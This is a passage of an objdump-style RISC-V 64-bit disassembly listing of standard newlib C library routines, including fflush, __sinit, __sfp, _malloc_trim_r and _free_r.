   120b6:	f9771de3          	bne	a4,s7,12050 <__call_exitprocs+0x1e>
   120ba:	fcf406e3          	beq	s0,a5,12086 <__call_exitprocs+0x54>
   120be:	bf49                	j	12050 <__call_exitprocs+0x1e>
   120c0:	00093823          	sd	zero,16(s2)
   120c4:	bfd9                	j	1209a <__call_exitprocs+0x68>
   120c6:	31442783          	lw	a5,788(s0)
   120ca:	11093583          	ld	a1,272(s2)
   120ce:	8ff1                	and	a5,a5,a2
   120d0:	2781                	sext.w	a5,a5
   120d2:	e781                	bnez	a5,120da <__call_exitprocs+0xa8>
   120d4:	8556                	mv	a0,s5
   120d6:	9682                	jalr	a3
   120d8:	bfe1                	j	120b0 <__call_exitprocs+0x7e>
   120da:	852e                	mv	a0,a1
   120dc:	9682                	jalr	a3
   120de:	bfc9                	j	120b0 <__call_exitprocs+0x7e>

00000000000120e0 <__sflush_r>:
   120e0:	01059783          	lh	a5,16(a1)
   120e4:	7179                	addi	sp,sp,-48
   120e6:	f022                	sd	s0,32(sp)
   120e8:	03079713          	slli	a4,a5,0x30
   120ec:	9341                	srli	a4,a4,0x30
   120ee:	ec26                	sd	s1,24(sp)
   120f0:	f406                	sd	ra,40(sp)
   120f2:	e84a                	sd	s2,16(sp)
   120f4:	e44e                	sd	s3,8(sp)
   120f6:	00877693          	andi	a3,a4,8
   120fa:	84aa                	mv	s1,a0
   120fc:	842e                	mv	s0,a1
   120fe:	10069063          	bnez	a3,121fe <__sflush_r+0x11e>
   12102:	6705                	lui	a4,0x1
   12104:	80070713          	addi	a4,a4,-2048 # 800 <_start-0xf8b0>
   12108:	8fd9                	or	a5,a5,a4
   1210a:	4598                	lw	a4,8(a1)
   1210c:	00f59823          	sh	a5,16(a1)
   12110:	00e04d63          	bgtz	a4,1212a <__sflush_r+0x4a>
   12114:	59b8                	lw	a4,112(a1)
   12116:	00e04a63          	bgtz	a4,1212a <__sflush_r+0x4a>
   1211a:	4501                	li	a0,0
   1211c:	70a2                	ld	ra,40(sp)
   1211e:	7402                	ld	s0,32(sp)
   12120:	64e2                	ld	s1,24(sp)
   12122:	6942                	ld	s2,16(sp)
   12124:	69a2                	ld	s3,8(sp)
   12126:	6145                	addi	sp,sp,48
   12128:	8082                	ret
   1212a:	6438                	ld	a4,72(s0)
   1212c:	d77d                	beqz	a4,1211a <__sflush_r+0x3a>
   1212e:	0004a903          	lw	s2,0(s1)
   12132:	03379693          	slli	a3,a5,0x33
   12136:	0004a023          	sw	zero,0(s1)
   1213a:	780c                	ld	a1,48(s0)
   1213c:	0806d863          	bgez	a3,121cc <__sflush_r+0xec>
   12140:	6850                	ld	a2,144(s0)
   12142:	01045783          	lhu	a5,16(s0)
   12146:	8b91                	andi	a5,a5,4
   12148:	c799                	beqz	a5,12156 <__sflush_r+0x76>
   1214a:	441c                	lw	a5,8(s0)
   1214c:	8e1d                	sub	a2,a2,a5
   1214e:	6c3c                	ld	a5,88(s0)
   12150:	c399                	beqz	a5,12156 <__sflush_r+0x76>
   12152:	583c                	lw	a5,112(s0)
   12154:	8e1d                	sub	a2,a2,a5
   12156:	643c                	ld	a5,72(s0)
   12158:	780c                	ld	a1,48(s0)
   1215a:	4681                	li	a3,0
   1215c:	8526                	mv	a0,s1
   1215e:	9782                	jalr	a5
   12160:	57fd                	li	a5,-1
   12162:	01045683          	lhu	a3,16(s0)
   12166:	00f51d63          	bne	a0,a5,12180 <__sflush_r+0xa0>
   1216a:	409c                	lw	a5,0(s1)
   1216c:	4775                	li	a4,29
   1216e:	08f76263          	bltu	a4,a5,121f2 <__sflush_r+0x112>
   12172:	20400737          	lui	a4,0x20400
   12176:	0705                	addi	a4,a4,1
   12178:	00f75733          	srl	a4,a4,a5
   1217c:	8b05                	andi	a4,a4,1
   1217e:	cb35                	beqz	a4,121f2 <__sflush_r+0x112>
   12180:	77fd                	lui	a5,0xfffff
   12182:	7ff78793          	addi	a5,a5,2047 # fffffffffffff7ff <_end+0xfffffffffff3ecdf>
   12186:	6c18                	ld	a4,24(s0)
   12188:	8ff5                	and	a5,a5,a3
   1218a:	0107979b          	slliw	a5,a5,0x10
   1218e:	4107d79b          	sraiw	a5,a5,0x10
   12192:	e018                	sd	a4,0(s0)
   12194:	00f41823          	sh	a5,16(s0)
   12198:	00042423          	sw	zero,8(s0)
   1219c:	03379713          	slli	a4,a5,0x33
   121a0:	00075863          	bgez	a4,121b0 <__sflush_r+0xd0>
   121a4:	57fd                	li	a5,-1
   121a6:	00f51463          	bne	a0,a5,121ae <__sflush_r+0xce>
   121aa:	409c                	lw	a5,0(s1)
   121ac:	e391                	bnez	a5,121b0 <__sflush_r+0xd0>
   121ae:	e848                	sd	a0,144(s0)
   121b0:	6c2c                	ld	a1,88(s0)
   121b2:	0124a023          	sw	s2,0(s1)
   121b6:	d1b5                	beqz	a1,1211a <__sflush_r+0x3a>
   121b8:	07440793          	addi	a5,s0,116
   121bc:	00f58563          	beq	a1,a5,121c6 <__sflush_r+0xe6>
   121c0:	8526                	mv	a0,s1
   121c2:	368000ef          	jal	ra,1252a <_free_r>
   121c6:	04043c23          	sd	zero,88(s0)
   121ca:	bf81                	j	1211a <__sflush_r+0x3a>
   121cc:	4601                	li	a2,0
   121ce:	4685                	li	a3,1
   121d0:	8526                	mv	a0,s1
   121d2:	9702                	jalr	a4
   121d4:	57fd                	li	a5,-1
   121d6:	862a                	mv	a2,a0
   121d8:	f6f515e3          	bne	a0,a5,12142 <__sflush_r+0x62>
   121dc:	409c                	lw	a5,0(s1)
   121de:	d3b5                	beqz	a5,12142 <__sflush_r+0x62>
   121e0:	4775                	li	a4,29
   121e2:	00e78563          	beq	a5,a4,121ec <__sflush_r+0x10c>
   121e6:	4759                	li	a4,22
   121e8:	04e79463          	bne	a5,a4,12230 <__sflush_r+0x150>
   121ec:	0124a023          	sw	s2,0(s1)
   121f0:	b72d                	j	1211a <__sflush_r+0x3a>
   121f2:	0406e793          	ori	a5,a3,64
   121f6:	00f41823          	sh	a5,16(s0)
   121fa:	557d                	li	a0,-1
   121fc:	b705                	j	1211c <__sflush_r+0x3c>
   121fe:	0185b983          	ld	s3,24(a1)
   12202:	f0098ce3          	beqz	s3,1211a <__sflush_r+0x3a>
   12206:	0005b903          	ld	s2,0(a1)
   1220a:	8b0d                	andi	a4,a4,3
   1220c:	0135b023          	sd	s3,0(a1)
   12210:	4139093b          	subw	s2,s2,s3
   12214:	4781                	li	a5,0
   12216:	e311                	bnez	a4,1221a <__sflush_r+0x13a>
   12218:	519c                	lw	a5,32(a1)
   1221a:	c45c                	sw	a5,12(s0)
   1221c:	ef205fe3          	blez	s2,1211a <__sflush_r+0x3a>
   12220:	603c                	ld	a5,64(s0)
   12222:	780c                	ld	a1,48(s0)
   12224:	86ca                	mv	a3,s2
   12226:	864e                	mv	a2,s3
   12228:	8526                	mv	a0,s1
   1222a:	9782                	jalr	a5
   1222c:	00a04763          	bgtz	a0,1223a <__sflush_r+0x15a>
   12230:	01045783          	lhu	a5,16(s0)
   12234:	0407e793          	ori	a5,a5,64
   12238:	bf7d                	j	121f6 <__sflush_r+0x116>
   1223a:	99aa                	add	s3,s3,a0
   1223c:	40a9093b          	subw	s2,s2,a0
   12240:	bff1                	j	1221c <__sflush_r+0x13c>

0000000000012242 <_fflush_r>:
   12242:	1101                	addi	sp,sp,-32
   12244:	e822                	sd	s0,16(sp)
   12246:	ec06                	sd	ra,24(sp)
   12248:	842a                	mv	s0,a0
   1224a:	c519                	beqz	a0,12258 <_fflush_r+0x16>
   1224c:	493c                	lw	a5,80(a0)
   1224e:	e789                	bnez	a5,12258 <_fflush_r+0x16>
   12250:	e42e                	sd	a1,8(sp)
   12252:	108000ef          	jal	ra,1235a <__sinit>
   12256:	65a2                	ld	a1,8(sp)
   12258:	01059783          	lh	a5,16(a1)
   1225c:	c799                	beqz	a5,1226a <_fflush_r+0x28>
   1225e:	8522                	mv	a0,s0
   12260:	6442                	ld	s0,16(sp)
   12262:	60e2                	ld	ra,24(sp)
   12264:	6105                	addi	sp,sp,32
   12266:	e7bff06f          	j	120e0 <__sflush_r>
   1226a:	60e2                	ld	ra,24(sp)
   1226c:	6442                	ld	s0,16(sp)
   1226e:	4501                	li	a0,0
   12270:	6105                	addi	sp,sp,32
   12272:	8082                	ret

0000000000012274 <fflush>:
   12274:	85aa                	mv	a1,a0
   12276:	e909                	bnez	a0,12288 <fflush+0x14>
   12278:	8381b503          	ld	a0,-1992(gp) # 1c1f0 <_global_impure_ptr>
   1227c:	000125b7          	lui	a1,0x12
   12280:	24258593          	addi	a1,a1,578 # 12242 <_fflush_r>
   12284:	7a60006f          	j	12a2a <_fwalk_reent>
   12288:	8401b503          	ld	a0,-1984(gp) # 1c1f8 <_impure_ptr>
   1228c:	fb7ff06f          	j	12242 <_fflush_r>

0000000000012290 <__fp_lock>:
   12290:	4501                	li	a0,0
   12292:	8082                	ret

0000000000012294 <_cleanup_r>:
   12294:	000185b7          	lui	a1,0x18
   12298:	ad058593          	addi	a1,a1,-1328 # 17ad0 <_fclose_r>
   1229c:	78e0006f          	j	12a2a <_fwalk_reent>

00000000000122a0 <std.isra.0>:
   122a0:	1141                	addi	sp,sp,-16
   122a2:	e022                	sd	s0,0(sp)
   122a4:	e406                	sd	ra,8(sp)
   122a6:	842a                	mv	s0,a0
   122a8:	00b51823          	sh	a1,16(a0)
   122ac:	00c51923          	sh	a2,18(a0)
   122b0:	00053023          	sd	zero,0(a0)
   122b4:	00053423          	sd	zero,8(a0)
   122b8:	0a052623          	sw	zero,172(a0)
   122bc:	00053c23          	sd	zero,24(a0)
   122c0:	02052023          	sw	zero,32(a0)
   122c4:	02052423          	sw	zero,40(a0)
   122c8:	4621                	li	a2,8
   122ca:	4581                	li	a1,0
   122cc:	0a450513          	addi	a0,a0,164
   122d0:	c48fe0ef          	jal	ra,10718 <memset>
   122d4:	000167b7          	lui	a5,0x16
   122d8:	8ac78793          	addi	a5,a5,-1876 # 158ac <__sread>
   122dc:	fc1c                	sd	a5,56(s0)
   122de:	000167b7          	lui	a5,0x16
   122e2:	8e278793          	addi	a5,a5,-1822 # 158e2 <__swrite>
   122e6:	e03c                	sd	a5,64(s0)
   122e8:	000167b7          	lui	a5,0x16
   122ec:	93478793          	addi	a5,a5,-1740 # 15934 <__sseek>
   122f0:	e43c                	sd	a5,72(s0)
   122f2:	000167b7          	lui	a5,0x16
   122f6:	96c78793          	addi	a5,a5,-1684 # 1596c <__sclose>
   122fa:	f800                	sd	s0,48(s0)
   122fc:	e83c                	sd	a5,80(s0)
   122fe:	60a2                	ld	ra,8(sp)
   12300:	6402                	ld	s0,0(sp)
   12302:	0141                	addi	sp,sp,16
   12304:	8082                	ret

0000000000012306 <__fp_unlock>:
   12306:	4501                	li	a0,0
   12308:	8082                	ret

000000000001230a <__sfmoreglue>:
   1230a:	1101                	addi	sp,sp,-32
   1230c:	e426                	sd	s1,8(sp)
   1230e:	0b000613          	li	a2,176
   12312:	fff5849b          	addiw	s1,a1,-1
   12316:	02c484b3          	mul	s1,s1,a2
   1231a:	e04a                	sd	s2,0(sp)
   1231c:	892e                	mv	s2,a1
   1231e:	e822                	sd	s0,16(sp)
   12320:	ec06                	sd	ra,24(sp)
   12322:	0c848593          	addi	a1,s1,200
   12326:	032020ef          	jal	ra,14358 <_malloc_r>
   1232a:	842a                	mv	s0,a0
   1232c:	cd01                	beqz	a0,12344 <__sfmoreglue+0x3a>
   1232e:	00053023          	sd	zero,0(a0)
   12332:	01252423          	sw	s2,8(a0)
   12336:	0561                	addi	a0,a0,24
   12338:	e808                	sd	a0,16(s0)
   1233a:	0b048613          	addi	a2,s1,176
   1233e:	4581                	li	a1,0
   12340:	bd8fe0ef          	jal	ra,10718 <memset>
   12344:	8522                	mv	a0,s0
   12346:	60e2                	ld	ra,24(sp)
   12348:	6442                	ld	s0,16(sp)
   1234a:	64a2                	ld	s1,8(sp)
   1234c:	6902                	ld	s2,0(sp)
   1234e:	6105                	addi	sp,sp,32
   12350:	8082                	ret

0000000000012352 <_cleanup>:
   12352:	8381b503          	ld	a0,-1992(gp) # 1c1f0 <_global_impure_ptr>
   12356:	f3fff06f          	j	12294 <_cleanup_r>

000000000001235a <__sinit>:
   1235a:	493c                	lw	a5,80(a0)
   1235c:	eba1                	bnez	a5,123ac <__sinit+0x52>
   1235e:	1141                	addi	sp,sp,-16
   12360:	000127b7          	lui	a5,0x12
   12364:	e406                	sd	ra,8(sp)
   12366:	e022                	sd	s0,0(sp)
   12368:	29478793          	addi	a5,a5,660 # 12294 <_cleanup_r>
   1236c:	ed3c                	sd	a5,88(a0)
   1236e:	478d                	li	a5,3
   12370:	52f52423          	sw	a5,1320(a0)
   12374:	53850793          	addi	a5,a0,1336
   12378:	842a                	mv	s0,a0
   1237a:	52f53823          	sd	a5,1328(a0)
   1237e:	52053023          	sd	zero,1312(a0)
   12382:	6508                	ld	a0,8(a0)
   12384:	4601                	li	a2,0
   12386:	4591                	li	a1,4
   12388:	f19ff0ef          	jal	ra,122a0 <std.isra.0>
   1238c:	6808                	ld	a0,16(s0)
   1238e:	4605                	li	a2,1
   12390:	45a5                	li	a1,9
   12392:	f0fff0ef          	jal	ra,122a0 <std.isra.0>
   12396:	6c08                	ld	a0,24(s0)
   12398:	4609                	li	a2,2
   1239a:	45c9                	li	a1,18
   1239c:	f05ff0ef          	jal	ra,122a0 <std.isra.0>
   123a0:	4785                	li	a5,1
   123a2:	c83c                	sw	a5,80(s0)
   123a4:	60a2                	ld	ra,8(sp)
   123a6:	6402                	ld	s0,0(sp)
   123a8:	0141                	addi	sp,sp,16
   123aa:	8082                	ret
   123ac:	8082                	ret

00000000000123ae <__sfp>:
   123ae:	1101                	addi	sp,sp,-32
   123b0:	e426                	sd	s1,8(sp)
   123b2:	8381b483          	ld	s1,-1992(gp) # 1c1f0 <_global_impure_ptr>
   123b6:	e04a                	sd	s2,0(sp)
   123b8:	ec06                	sd	ra,24(sp)
   123ba:	48bc                	lw	a5,80(s1)
   123bc:	e822                	sd	s0,16(sp)
   123be:	892a                	mv	s2,a0
   123c0:	e781                	bnez	a5,123c8 <__sfp+0x1a>
   123c2:	8526                	mv	a0,s1
   123c4:	f97ff0ef          	jal	ra,1235a <__sinit>
   123c8:	52048493          	addi	s1,s1,1312
   123cc:	6880                	ld	s0,16(s1)
   123ce:	449c                	lw	a5,8(s1)
   123d0:	37fd                	addiw	a5,a5,-1
   123d2:	0007d663          	bgez	a5,123de <__sfp+0x30>
   123d6:	609c                	ld	a5,0(s1)
   123d8:	cb89                	beqz	a5,123ea <__sfp+0x3c>
   123da:	6084                	ld	s1,0(s1)
   123dc:	bfc5                	j	123cc <__sfp+0x1e>
   123de:	01041703          	lh	a4,16(s0)
   123e2:	c70d                	beqz	a4,1240c <__sfp+0x5e>
   123e4:	0b040413          	addi	s0,s0,176
   123e8:	b7e5                	j	123d0 <__sfp+0x22>
   123ea:	4591                	li	a1,4
   123ec:	854a                	mv	a0,s2
   123ee:	f1dff0ef          	jal	ra,1230a <__sfmoreglue>
   123f2:	e088                	sd	a0,0(s1)
   123f4:	f17d                	bnez	a0,123da <__sfp+0x2c>
   123f6:	47b1                	li	a5,12
   123f8:	00f92023          	sw	a5,0(s2)
   123fc:	4401                	li	s0,0
   123fe:	8522                	mv	a0,s0
   12400:	60e2                	ld	ra,24(sp)
   12402:	6442                	ld	s0,16(sp)
   12404:	64a2                	ld	s1,8(sp)
   12406:	6902                	ld	s2,0(sp)
   12408:	6105                	addi	sp,sp,32
   1240a:	8082                	ret
   1240c:	77c1                	lui	a5,0xffff0
   1240e:	2785                	addiw	a5,a5,1
   12410:	0a042623          	sw	zero,172(s0)
   12414:	00043023          	sd	zero,0(s0)
   12418:	00043423          	sd	zero,8(s0)
   1241c:	c81c                	sw	a5,16(s0)
   1241e:	00043c23          	sd	zero,24(s0)
   12422:	02042023          	sw	zero,32(s0)
   12426:	02042423          	sw	zero,40(s0)
   1242a:	4621                	li	a2,8
   1242c:	4581                	li	a1,0
   1242e:	0a440513          	addi	a0,s0,164
   12432:	ae6fe0ef          	jal	ra,10718 <memset>
   12436:	04043c23          	sd	zero,88(s0)
   1243a:	06042023          	sw	zero,96(s0)
   1243e:	06043c23          	sd	zero,120(s0)
   12442:	08042023          	sw	zero,128(s0)
   12446:	bf65                	j	123fe <__sfp+0x50>

0000000000012448 <__sfp_lock_acquire>:
   12448:	8082                	ret

000000000001244a <__sfp_lock_release>:
   1244a:	8082                	ret

000000000001244c <__sinit_lock_acquire>:
   1244c:	8082                	ret

000000000001244e <__sinit_lock_release>:
   1244e:	8082                	ret

0000000000012450 <__fp_lock_all>:
   12450:	8401b503          	ld	a0,-1984(gp) # 1c1f8 <_impure_ptr>
   12454:	000125b7          	lui	a1,0x12
   12458:	29058593          	addi	a1,a1,656 # 12290 <__fp_lock>
   1245c:	56a0006f          	j	129c6 <_fwalk>

0000000000012460 <__fp_unlock_all>:
   12460:	8401b503          	ld	a0,-1984(gp) # 1c1f8 <_impure_ptr>
   12464:	000125b7          	lui	a1,0x12
   12468:	30658593          	addi	a1,a1,774 # 12306 <__fp_unlock>
   1246c:	55a0006f          	j	129c6 <_fwalk>

0000000000012470 <_malloc_trim_r>:
   12470:	7139                	addi	sp,sp,-64
   12472:	f04a                	sd	s2,32(sp)
   12474:	6971                	lui	s2,0x1c
   12476:	f822                	sd	s0,48(sp)
   12478:	f426                	sd	s1,40(sp)
   1247a:	ec4e                	sd	s3,24(sp)
   1247c:	e42e                	sd	a1,8(sp)
   1247e:	fc06                	sd	ra,56(sp)
   12480:	89aa                	mv	s3,a0
   12482:	9a890913          	addi	s2,s2,-1624 # 1b9a8 <__malloc_av_>
   12486:	516020ef          	jal	ra,1499c <__malloc_lock>
   1248a:	01093783          	ld	a5,16(s2)
   1248e:	65a2                	ld	a1,8(sp)
   12490:	6784                	ld	s1,8(a5)
   12492:	6785                	lui	a5,0x1
   12494:	fdf78413          	addi	s0,a5,-33 # fdf <_start-0xf0d1>
   12498:	98f1                	andi	s1,s1,-4
   1249a:	8c0d                	sub	s0,s0,a1
   1249c:	9426                	add	s0,s0,s1
   1249e:	8031                	srli	s0,s0,0xc
   124a0:	147d                	addi	s0,s0,-1
   124a2:	0432                	slli	s0,s0,0xc
   124a4:	00f45d63          	ble	a5,s0,124be <_malloc_trim_r+0x4e>
   124a8:	854e                	mv	a0,s3
   124aa:	4f4020ef          	jal	ra,1499e <__malloc_unlock>
   124ae:	4501                	li	a0,0
   124b0:	70e2                	ld	ra,56(sp)
   124b2:	7442                	ld	s0,48(sp)
   124b4:	74a2                	ld	s1,40(sp)
   124b6:	7902                	ld	s2,32(sp)
   124b8:	69e2                	ld	s3,24(sp)
   124ba:	6121                	addi	sp,sp,64
   124bc:	8082                	ret
   124be:	4581                	li	a1,0
   124c0:	854e                	mv	a0,s3
   124c2:	2c0030ef          	jal	ra,15782 <_sbrk_r>
   124c6:	01093783          	ld	a5,16(s2)
   124ca:	97a6                	add	a5,a5,s1
   124cc:	fcf51ee3          	bne	a0,a5,124a8 <_malloc_trim_r+0x38>
   124d0:	408005b3          	neg	a1,s0
   124d4:	854e                	mv	a0,s3
   124d6:	2ac030ef          	jal	ra,15782 <_sbrk_r>
   124da:	57fd                	li	a5,-1
   124dc:	02f51663          	bne	a0,a5,12508 <_malloc_trim_r+0x98>
   124e0:	4581                	li	a1,0
   124e2:	854e                	mv	a0,s3
   124e4:	29e030ef          	jal	ra,15782 <_sbrk_r>
   124e8:	01093703          	ld	a4,16(s2)
   124ec:	46fd                	li	a3,31
   124ee:	40e507b3          	sub	a5,a0,a4
   124f2:	faf6dbe3          	ble	a5,a3,124a8 <_malloc_trim_r+0x38>
   124f6:	8481b683          	ld	a3,-1976(gp) # 1c200 <__malloc_sbrk_base>
   124fa:	0017e793          	ori	a5,a5,1
   124fe:	e71c                	sd	a5,8(a4)
   12500:	8d15                	sub	a0,a0,a3
   12502:	0aa1ac23          	sw	a0,184(gp) # 1ca70 <__malloc_current_mallinfo>
   12506:	b74d                	j	124a8 <_malloc_trim_r+0x38>
   12508:	01093783          	ld	a5,16(s2)
   1250c:	8c81                	sub	s1,s1,s0
   1250e:	0014e493          	ori	s1,s1,1
   12512:	e784                	sd	s1,8(a5)
   12514:	0b81a783          	lw	a5,184(gp) # 1ca70 <__malloc_current_mallinfo>
   12518:	854e                	mv	a0,s3
   1251a:	4087843b          	subw	s0,a5,s0
   1251e:	0a81ac23          	sw	s0,184(gp) # 1ca70 <__malloc_current_mallinfo>
   12522:	47c020ef          	jal	ra,1499e <__malloc_unlock>
   12526:	4505                	li	a0,1
   12528:	b761                	j	124b0 <_malloc_trim_r+0x40>

000000000001252a <_free_r>:
   1252a:	1a058863          	beqz	a1,126da <_free_r+0x1b0>
   1252e:	1101                	addi	sp,sp,-32
   12530:	e822                	sd	s0,16(sp)
   12532:	e426                	sd	s1,8(sp)
   12534:	842a                	mv	s0,a0
   12536:	84ae                	mv	s1,a1
   12538:	ec06                	sd	ra,24(sp)
   1253a:	462020ef          	jal	ra,1499c <__malloc_lock>
   1253e:	ff84b503          	ld	a0,-8(s1)
   12542:	6671                	lui	a2,0x1c
   12544:	ff048693          	addi	a3,s1,-16
   12548:	ffe57793          	andi	a5,a0,-2
   1254c:	9a860813          	addi	a6,a2,-1624 # 1b9a8 <__malloc_av_>
   12550:	00f685b3          	add	a1,a3,a5
   12554:	6598                	ld	a4,8(a1)
   12556:	01083803          	ld	a6,16(a6)
   1255a:	9a860613          	addi	a2,a2,-1624
   1255e:	9b71                	andi	a4,a4,-4
   12560:	8905                	andi	a0,a0,1
   12562:	04b81063          	bne	a6,a1,125a2 <_free_r+0x78>
   12566:	97ba                	add	a5,a5,a4
   12568:	e909                	bnez	a0,1257a <_free_r+0x50>
   1256a:	ff04b703          	ld	a4,-16(s1)
   1256e:	8e99                	sub	a3,a3,a4
   12570:	6a8c                	ld	a1,16(a3)
   12572:	97ba                	add	a5,a5,a4
   12574:	6e98                	ld	a4,24(a3)
   12576:	ed98                	sd	a4,24(a1)
   12578:	eb0c                	sd	a1,16(a4)
   1257a:	0017e713          	ori	a4,a5,1
   1257e:	e698                	sd	a4,8(a3)
   12580:	8501b703          	ld	a4,-1968(gp) # 1c208 <__malloc_trim_threshold>
   12584:	ea14                	sd	a3,16(a2)
   12586:	00e7e763          	bltu	a5,a4,12594 <_free_r+0x6a>
   1258a:	8701b583          	ld	a1,-1936(gp) # 1c228 <__malloc_top_pad>
   1258e:	8522                	mv	a0,s0
   12590:	ee1ff0ef          	jal	ra,12470 <_malloc_trim_r>
   12594:	8522                	mv	a0,s0
   12596:	6442                	ld	s0,16(sp)
   12598:	60e2                	ld	ra,24(sp)
   1259a:	64a2                	ld	s1,8(sp)
   1259c:	6105                	addi	sp,sp,32
   1259e:	4000206f          	j	1499e <__malloc_unlock>
   125a2:	e598                	sd	a4,8(a1)
   125a4:	4801                	li	a6,0
   125a6:	e10d                	bnez	a0,125c8 <_free_r+0x9e>
   125a8:	ff04b503          	ld	a0,-16(s1)
   125ac:	68f1                	lui	a7,0x1c
   125ae:	9b888893          	addi	a7,a7,-1608 # 1b9b8 <__malloc_av_+0x10>
   125b2:	8e89                	sub	a3,a3,a0
   125b4:	97aa                	add	a5,a5,a0
   125b6:	6a88                	ld	a0,16(a3)
   125b8:	07150e63          	beq	a0,a7,12634 <_free_r+0x10a>
   125bc:	0186b883          	ld	a7,24(a3)
   125c0:	01153c23          	sd	a7,24(a0)
   125c4:	00a8b823          	sd	a0,16(a7)
   125c8:	00e58533          	add	a0,a1,a4
   125cc:	6508                	ld	a0,8(a0)
   125ce:	8905                	andi	a0,a0,1
   125d0:	ed19                	bnez	a0,125ee <_free_r+0xc4>
   125d2:	97ba                	add	a5,a5,a4
   125d4:	6998                	ld	a4,16(a1)
   125d6:	06081163          	bnez	a6,12638 <_free_r+0x10e>
   125da:	6571                	lui	a0,0x1c
   125dc:	9b850513          	addi	a0,a0,-1608 # 1b9b8 <__malloc_av_+0x10>
   125e0:	04a71c63          	bne	a4,a0,12638 <_free_r+0x10e>
   125e4:	f614                	sd	a3,40(a2)
   125e6:	f214                	sd	a3,32(a2)
   125e8:	ee98                	sd	a4,24(a3)
   125ea:	ea98                	sd	a4,16(a3)
   125ec:	4805                	li	a6,1
   125ee:	0017e713          	ori	a4,a5,1
   125f2:	e698                	sd	a4,8(a3)
   125f4:	00f68733          	add	a4,a3,a5
   125f8:	e31c                	sd	a5,0(a4)
   125fa:	f8081de3          	bnez	a6,12594 <_free_r+0x6a>
   125fe:	1ff00713          	li	a4,511
   12602:	02f76f63          	bltu	a4,a5,12640 <_free_r+0x116>
   12606:	838d                	srli	a5,a5,0x3
   12608:	2781                	sext.w	a5,a5
   1260a:	4027d59b          	sraiw	a1,a5,0x2
   1260e:	4705                	li	a4,1
   12610:	00b71733          	sll	a4,a4,a1
   12614:	2785                	addiw	a5,a5,1
   12616:	660c                	ld	a1,8(a2)
   12618:	0017979b          	slliw	a5,a5,0x1
   1261c:	078e                	slli	a5,a5,0x3
   1261e:	97b2                	add	a5,a5,a2
   12620:	8f4d                	or	a4,a4,a1
   12622:	e618                	sd	a4,8(a2)
   12624:	6398                	ld	a4,0(a5)
   12626:	ff078613          	addi	a2,a5,-16
   1262a:	ee90                	sd	a2,24(a3)
   1262c:	ea98                	sd	a4,16(a3)
   1262e:	e394                	sd	a3,0(a5)
   12630:	ef14                	sd	a3,24(a4)
   12632:	b78d                	j	12594 <_free_r+0x6a>
   12634:	4805                	li	a6,1
   12636:	bf49                	j	125c8 <_free_r+0x9e>
   12638:	6d8c                	ld	a1,24(a1)
   1263a:	ef0c                	sd	a1,24(a4)
   1263c:	e998                	sd	a4,16(a1)
   1263e:	bf45                	j	125ee <_free_r+0xc4>
   12640:	0097d593          	srli	a1,a5,0x9
   12644:	4711                	li	a4,4
   12646:	02b76e63          	bltu	a4,a1,12682 <_free_r+0x158>
   1264a:	0067d713          	srli	a4,a5,0x6
   1264e:	0387071b          	addiw	a4,a4,56
   12652:	0017059b          	addiw	a1,a4,1
   12656:	0015959b          	slliw	a1,a1,0x1
   1265a:	058e                	slli	a1,a1,0x3
   1265c:	95b2                	add	a1,a1,a2
   1265e:	ff058513          	addi	a0,a1,-16
   12662:	618c                	ld	a1,0(a1)
   12664:	06b51563          	bne	a0,a1,126ce <_free_r+0x1a4>
   12668:	4785                	li	a5,1
   1266a:	4027571b          	sraiw	a4,a4,0x2
   1266e:	00e79733          	sll	a4,a5,a4
   12672:	661c                	ld	a5,8(a2)
   12674:	8f5d                	or	a4,a4,a5
   12676:	e618                	sd	a4,8(a2)
   12678:	ee88                	sd	a0,24(a3)
   1267a:	ea8c                	sd	a1,16(a3)
   1267c:	e914                	sd	a3,16(a0)
   1267e:	ed94                	sd	a3,24(a1)
   12680:	bf11                	j	12594 <_free_r+0x6a>
   12682:	4751                	li	a4,20
   12684:	00b76563          	bltu	a4,a1,1268e <_free_r+0x164>
   12688:	05b5871b          	addiw	a4,a1,91
   1268c:	b7d9                	j	12652 <_free_r+0x128>
   1268e:	05400713          	li	a4,84
   12692:	00b76763          	bltu	a4,a1,126a0 <_free_r+0x176>
   12696:	00c7d713          	srli	a4,a5,0xc
   1269a:	06e7071b          	addiw	a4,a4,110
   1269e:	bf55                	j	12652 <_free_r+0x128>
   126a0:	15400713          	li	a4,340
   126a4:	00b76763          	bltu	a4,a1,126b2 <_free_r+0x188>
   126a8:	00f7d713          	srli	a4,a5,0xf
   126ac:	0777071b          	addiw	a4,a4,119
   126b0:	b74d                	j	12652 <_free_r+0x128>
   126b2:	55400513          	li	a0,1364
   126b6:	07e00713          	li	a4,126
   126ba:	f8b56ce3          	bltu	a0,a1,12652 <_free_r+0x128>
   126be:	0127d713          	srli	a4,a5,0x12
   126c2:	07c7071b          	addiw	a4,a4,124
   126c6:	b771                	j	12652 <_free_r+0x128>
   126c8:	698c                	ld	a1,16(a1)
   126ca:	00b50663          	beq	a0,a1,126d6 <_free_r+0x1ac>
   126ce:	6598                	ld	a4,8(a1)
   126d0:	9b71                	andi	a4,a4,-4
   126d2:	fee7ebe3          	bltu	a5,a4,126c8 <_free_r+0x19e>
   126d6:	6d88                	ld	a0,24(a1)
   126d8:	b745                	j	12678 <_free_r+0x14e>
   126da:	8082                	ret

00000000000126dc <__sfvwrite_r>:
   126dc:	6a1c                	ld	a5,16(a2)
   126de:	e781                	bnez	a5,126e6 <__sfvwrite_r+0xa>
   126e0:	4781                	li	a5,0
   126e2:	853e                	mv	a0,a5
   126e4:	8082                	ret
   126e6:	0105d783          	lhu	a5,16(a1)
   126ea:	7119                	addi	sp,sp,-128
   126ec:	f8a2                	sd	s0,112(sp)
   126ee:	f0ca                	sd	s2,96(sp)
   126f0:	e8d2                	sd	s4,80(sp)
   126f2:	fc86                	sd	ra,120(sp)
   126f4:	f4a6                	sd	s1,104(sp)
   126f6:	ecce                	sd	s3,88(sp)
   126f8:	e4d6                	sd	s5,72(sp)
   126fa:	e0da                	sd	s6,64(sp)
   126fc:	fc5e                	sd	s7,56(sp)
   126fe:	f862                	sd	s8,48(sp)
   12700:	f466                	sd	s9,40(sp)
   12702:	f06a                	sd	s10,32(sp)
   12704:	ec6e                	sd	s11,24(sp)
   12706:	8ba1                	andi	a5,a5,8
   12708:	8a32                	mv	s4,a2
   1270a:	842e                	mv	s0,a1
   1270c:	892a                	mv	s2,a0
   1270e:	cfd1                	beqz	a5,127aa <__sfvwrite_r+0xce>
   12710:	6d9c                	ld	a5,24(a1)
   12712:	cfc1                	beqz	a5,127aa <__sfvwrite_r+0xce>
   12714:	01045783          	lhu	a5,16(s0)
   12718:	000a3983          	ld	s3,0(s4)
